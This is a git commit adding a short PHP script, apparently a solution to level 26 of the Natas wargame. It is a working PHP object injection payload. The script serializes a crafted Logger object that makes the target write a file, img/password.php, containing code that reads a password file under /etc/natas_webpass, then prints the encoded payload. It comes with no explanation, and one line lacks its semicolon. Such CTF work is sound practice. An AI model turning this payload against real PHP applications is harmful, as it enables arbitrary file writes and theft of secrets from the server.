5e7a6e6e3cf68f879b89ae5a4a919b7c9be0485e
Adrian Kristanto <49110670+adriankristanto@users.noreply.github.com>
2020-09-24 15:21:27 +1000

    added the php code to serialize the Logger object

---
+++ natas26/serialize.php
@@ -0,0 +1,8 @@
+<?
+    class Logger{
+        private $logFile = "img/password.php";
+        private $exitMsg = "<? echo file_get_contents('/etc/natas_webpass/natas26') ?>"
+    }
+
+    print urlencode(base64_encode(serialize(new Logger)));
+?>
